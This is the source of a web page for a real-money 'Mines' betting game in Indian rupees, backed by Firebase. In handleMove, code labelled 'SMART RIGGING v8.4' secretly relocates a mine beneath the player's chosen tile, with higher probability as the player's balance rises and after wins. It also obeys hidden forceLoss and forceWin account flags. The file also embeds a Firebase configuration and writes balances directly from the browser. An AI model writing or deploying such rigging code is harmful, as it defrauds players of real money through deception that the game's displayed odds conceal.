<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mines Master Pro | Smart Rigged</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #6366f1; --surface: #1e293b; --bg: #0f172a; --success: #10b981; --danger: #ef4444; --accent: #fbbf24; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; overflow-x: hidden; }
        .game-shell { width: 100%; max-width: 450px; min-height: 100vh; background: #111827; padding: 15px; box-sizing: border-box; }
        .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 18px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
        .balance-chip { font-weight: 800; color: var(--accent); font-size: 18px; }
        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 15px; min-height: 300px; }
        .slot { aspect-ratio: 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; cursor: pointer; border: 2px solid transparent; transition: all 0.2s; box-shadow: inset 0 0 10px rgba(0,0,0,0.3); }
        .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; }
        .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; }
        .lvl-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
        .lvl-btn { padding: 12px; border: 1px solid #334155; border-radius: 12px; background: #1e293b; color: #94a3b8; font-weight: 700; cursor: pointer; font-size: 11px; }
        .lvl-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
        .bet-area { background: #1e293b; padding: 18px; border-radius: 20px; margin-bottom: 15px; }
        input { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 14px; border-radius: 12px; color: white; margin: 10px 0; text-align: center; font-weight: bold; font-size: 18px; outline: none; }
        .main-btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; font-size: 14px; }
        .btn-start { background: var(--primary); color: white; box-shadow: 0 4px 0 #4338ca; }
        .btn-cashout { background: var(--success); color: white; display: none; box-shadow: 0 4px 0 #059669; }
        .overlay { display: none; position: fixed; inset:0; background:rgba(0,0,0,0.9); z-index:2000; justify-content:center; align-items:center; }
        .modal { background:#1e293b; padding:30px; border-radius:24px; text-align:center; width:85%; }
        .list-container { height: 180px; overflow-y: auto; padding: 10px; background: #0a0a0a; border-radius: 15px; margin-top: 10px; border: 1px solid #222; }
        .tx-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #1a1a1a; font-size: 11px; color: #888; }
    </style>
</head>
<body>

<div class="game-shell">
    <div class="header">
        <span style="font-weight:900; letter-spacing:1px;">MINES <span style="color:var(--primary)">PRO</span></span>
        <div class="balance-chip">â‚¹<span id="balanceDisplay">0.00</span></div>
    </div>
    <div class="lvl-box">
        <button class="lvl-btn active" id="btn-easy" onclick="changeLvl('easy')">3 MINES</button>
        <button class="lvl-btn" id="btn-medium" onclick="changeLvl('medium')">10 MINES</button>
        <button class="lvl-btn" id="btn-hard" onclick="changeLvl('hard')">24 MINES</button>
    </div>
    <div class="grid" id="gameGrid"></div>
    <div class="bet-area">
        <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:10px; font-weight:bold;">
            <span>MULT: <span id="multText" style="color:var(--accent)">1.00x</span></span>
            <span>PROFIT: <span id="profitText" style="color:var(--success)">â‚¹0.00</span></span>
        </div>
        <input type="number" id="betInput" value="10" min="10">
        <button id="startBtn" class="main-btn btn-start" onclick="startGame()">START GAME</button>
        <button id="cashBtn" class="main-btn btn-cashout" onclick="cashout()">CASHOUT</button>
    </div>
    <div style="font-size:11px; font-weight:700; color:#475569; margin-left:5px;">RECENT TRANSACTIONS</div>
    <div class="list-container" id="listContent"></div>
</div>

<div id="alertOverlay" class="overlay">
    <div class="modal">
        <div id="modalIcon" style="font-size:60px; margin-bottom:15px;"></div>
        <h2 id="modalTitle" style="margin:0;"></h2>
        <p id="modalDesc" style="color:#94a3b8; margin: 20px 0;"></p>
        <button class="main-btn btn-start" onclick="closeModal()">OKAY</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
    import { getDatabase, ref, onValue, update, increment, get, push, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", authDomain: "test-eb5e7.firebaseapp.com", databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", projectId: "test-eb5e7", appId: "1:366282855653:web:dca7e000f5a22fb11f300c" };
    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getDatabase(app);

    let balance = 0, currentLvl = 'easy', isPlaying = false, mines = [], diamondsFound = 0, currentMult = 1.0, activeBet = 0;
    let lastGameWin = false; 

    const mTable = {
        easy: [1.20, 1.88, 2.11, 3.00, 4.50, 6.00, 8.00, 9.00],
        medium: [1.50, 2.00, 4.50, 5.00, 7.00, 13.00],
        hard: [7.00, 19.00] 
    };

    const grid = document.getElementById("gameGrid");
    function createGrid() {
        grid.innerHTML = '';
        for(let i=0; i<25; i++) {
            const div = document.createElement("div"); 
            div.className = "slot";
            div.onclick = () => handleMove(i, div); 
            grid.appendChild(div);
        }
    }
    createGrid();

    onAuthStateChanged(auth, user => {
        if(!user) return;
        onValue(ref(db, `users/${user.uid}`), s => {
            balance = s.val()?.balance || 0;
            document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
        });
        loadTxs(user.uid);
    });

    window.changeLvl = (l) => { if(!isPlaying) { currentLvl = l; document.querySelectorAll('.lvl-btn').forEach(b => b.classList.remove('active')); document.getElementById(`btn-${l}`).classList.add('active'); } }

    window.startGame = async () => {
        activeBet = parseFloat(document.getElementById("betInput").value);
        if(!activeBet || activeBet < 10) return alert("Minimum Bet is â‚¹10");
        if(activeBet > balance) return alert("Low Balance!");

        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
        isPlaying = true; diamondsFound = 0; currentMult = 1.0; mines = [];
        
        let mCount = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 10 : 24);
        while(mines.length < mCount) { let r = Math.floor(Math.random()*25); if(!mines.includes(r)) mines.push(r); }

        document.getElementById("startBtn").style.display = "none";
        document.getElementById("cashBtn").style.display = "block";
        document.querySelectorAll(".slot").forEach(s => { s.className = "slot"; s.innerText = ""; });
    };

    window.handleMove = async (idx, el) => {
        if(!isPlaying || el.classList.contains('diamond')) return;

        const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
        const uData = uSnap.val() || {};
        let risk = 0.15; 

        // --- SMART RIGGING v8.4 ---
        if (uData.forceLoss) risk = 1.0;
        else if (uData.forceWin) risk = 0.0;
        else {
            if (currentLvl === 'easy' && diamondsFound >= 3) risk = 0.88;
            if (balance >= 180) { // Balance Protection Mode
                if (lastGameWin) risk = 0.92; 
                else risk = 0.40; // 40% chance to lose even after a loss
            }
            if (balance >= 350) risk = 0.98; // Hard Kill
        }

        // Apply Shift
        if (Math.random() < risk && !uData.forceWin) {
            if (!mines.includes(idx)) { mines.pop(); mines.push(idx); }
        }

        if(mines.includes(idx)) {
            gameOver(false);
        } else {
            diamondsFound++;
            el.innerText = "ðŸ’Ž"; el.classList.add("diamond");
            updateStats();
        }
    };

    function updateStats() {
        let table = mTable[currentLvl];
        currentMult = table[diamondsFound-1] || table[table.length-1];
        document.getElementById("multText").innerText = currentMult.toFixed(2) + "x";
        document.getElementById("profitText").innerText = "â‚¹" + (activeBet * currentMult).toFixed(2);
        document.getElementById("cashBtn").innerText = `CASHOUT â‚¹${(activeBet * currentMult).toFixed(2)}`;
    }

    window.cashout = async () => {
        if(!isPlaying || diamondsFound === 0) return;
        let win = activeBet * currentMult;
        isPlaying = false; lastGameWin = true;
        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(win), totalWin: increment(win) });
        saveTx('WIN', win);
        showModal("CASHOUT!", "Won â‚¹"+win.toFixed(2), "ðŸ†");
        resetUI();
    }

    function gameOver(won) {
        isPlaying = false; lastGameWin = false;
        mines.forEach(m => { grid.children[m].classList.add("bomb"); grid.children[m].innerText = "ðŸ’£"; });
        saveTx('LOSE', activeBet);
        setTimeout(() => { showModal("BOOM!", "Lost â‚¹"+activeBet, "ðŸ’¥"); resetUI(); }, 600);
    }

    function resetUI() { 
        document.getElementById("startBtn").style.display = "block"; 
        document.getElementById("cashBtn").style.display = "none"; 
        document.getElementById("multText").innerText = "1.00x";
        document.getElementById("profitText").innerText = "â‚¹0.00";
        document.getElementById("cashBtn").innerText = "CASHOUT";
    }

    async function saveTx(type, amt) {
        await push(ref(db, `transactions/${auth.currentUser.uid}`), { type, amount: amt, time: Date.now() });
    }

    function loadTxs(uid) {
        onValue(query(ref(db, `transactions/${uid}`), limitToLast(10)), s => {
            const list = document.getElementById("listContent"); list.innerHTML = "";
            s.forEach(c => {
                const d = c.val();
                list.innerHTML = `<div class="tx-row"><span>${new Date(d.time).toLocaleTimeString()}</span><span style="color:${d.type=='WIN'?'#10b981':'#ef4444'}">${d.type} â‚¹${d.amount.toFixed(2)}</span></div>` + list.innerHTML;
            });
        });
    }

    function showModal(t, d, i) { 
        document.getElementById("modalTitle").innerText = t; 
        document.getElementById("modalDesc").innerText = d; 
        document.getElementById("modalIcon").innerHTML = i; 
        document.getElementById("alertOverlay").style.display = "flex"; 
    }
    window.closeModal = () => document.getElementById("alertOverlay").style.display = "none";
</script>
</body>
</html>
